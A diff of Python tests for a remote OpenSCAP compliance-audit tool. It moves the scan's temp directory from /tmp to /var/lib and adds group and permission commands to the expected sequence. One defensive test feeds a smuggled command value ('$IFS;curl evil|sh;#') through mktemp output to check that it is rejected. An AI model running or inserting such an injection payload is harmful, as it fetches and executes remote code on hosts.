@@ -27,7 +27,7 @@ from conftest import FakeRemoteHost, fixture_path, make_config
 _IP = "10.0.10.21"
 _PROFILE = "xccdf_org.ssgproject.content_profile_cis_level1_server"
 _UBUNTU_OSR = 'ID=ubuntu\nVERSION_ID="22.04"\n'
-_TMP = "/tmp/grc_audit.Ab3xZ9"
+_TMP = "/var/lib/grc_audit.Ab3xZ9"
 _TRIAGE_DETAIL = "ssh banner says Ubuntu"
 
 # detect's probes, in the order detect runs them, all succeeding.
@@ -41,6 +41,7 @@ _DETECT_OK = [
 # scan_host's commands, all succeeding.
 _SCAN_OK = [
     ("mktemp", CommandResult(0, _TMP, "")),
+    ("id -gn", CommandResult(0, "grc-scan", "")),
     ("xccdf eval", CommandResult(0, "", "")),
 ]
 _READY = "Ubuntu 22.04, OpenSCAP 1.3.6, CIS L1 ready"
@@ -145,7 +146,7 @@ class _CleanupResetHost(FakeRemoteHost):
 
 
 def _scan_command(command):
-    return (command.startswith(("mktemp", "rm -rf"))
+    return (command.startswith(("mktemp", "id -gn", "chgrp", "chmod", "rm -rf"))
             or "xccdf eval" in command
             or f"test -f {_TMP}" in command)
 
@@ -322,6 +323,7 @@ def test_assess_scan_failed_detail_is_recorded_verbatim(tmp_path):
     # generic "scan failed: ..." fallback.
     conn = FakeRemoteHost(responses=_DETECT_OK + [
         ("mktemp", CommandResult(0, _TMP, "")),
+        ("id -gn", CommandResult(0, "grc-scan", "")),
         ("xccdf eval", CommandResult(1, "", "bad profile")),
     ])
     host, _ = _assess(conn, tmp_path=tmp_path)
@@ -336,6 +338,7 @@ def test_assess_scan_failed_detail_survives_a_failing_cleanup(tmp_path):
     # detail is the one recorded, as before assess existed.
     conn = _CleanupTimesOutHost(responses=_DETECT_OK + [
         ("mktemp", CommandResult(0, _TMP, "")),
+        ("id -gn", CommandResult(0, "grc-scan", "")),
         ("xccdf eval", CommandResult(1, "", "bad profile")),
     ])
     host, _ = _assess(conn, tmp_path=tmp_path)
@@ -377,6 +380,7 @@ def test_assess_scan_failed_detail_survives_a_reset_during_cleanup(tmp_path):
     # unwrapped. The oscap detail is still the one recorded.
     conn = _CleanupResetHost(responses=_DETECT_OK + [
         ("mktemp", CommandResult(0, _TMP, "")),
+        ("id -gn", CommandResult(0, "grc-scan", "")),
         ("xccdf eval", CommandResult(1, "", "bad profile")),
     ])
     host, _ = _assess(conn, tmp_path=tmp_path)
@@ -479,7 +483,7 @@ def test_assess_unreadable_os_release_is_scan_error():
 
 def test_assess_malicious_mktemp_is_scan_error(tmp_path):
     conn = _happy_host(extra=[
-        ("mktemp", CommandResult(0, "/tmp/grc_audit.aaaaaa$IFS;curl evil|sh;#", "")),
+        ("mktemp", CommandResult(0, "/var/lib/grc_audit.aaaaaa$IFS;curl evil|sh;#", "")),
     ])
     host, _ = _assess(conn, tmp_path=tmp_path)
 
